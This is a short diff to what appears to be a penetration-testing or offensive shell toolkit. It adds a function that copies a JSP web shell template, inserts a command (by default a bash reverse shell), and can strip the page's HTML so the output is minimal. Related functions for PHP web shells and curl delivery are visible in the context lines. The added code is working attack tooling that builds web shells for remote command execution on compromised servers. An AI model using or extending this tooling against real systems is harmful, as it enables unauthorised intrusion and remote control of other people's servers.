@@ -201,6 +201,23 @@ create_php_web_shell() {
     fi
 }
 
+create_jsp_webshell() {
+    cp $SCRIPTDIR/../jsp/webshell.jsp .
+    if [ -z "$cmd" ]; then
+        cmd=$(get_bash_reverse_shell)
+    fi
+    local cmd_replacement=$(escape_sed "$cmd")
+    cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
+    sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.jsp
+    
+    if [[ ! -z "$return_minimal" ]] && [[ "$return_minimal" == "true" ]]; then
+        sed -E -i '/html/d' webshell.jsp
+        sed -E -i '/body/d' webshell.jsp
+        sed -E -i '/title/d' webshell.jsp
+        sed -E -i '/head/d' webshell.jsp
+    fi
+}
+
 run_curl() {
 
     local url=$1
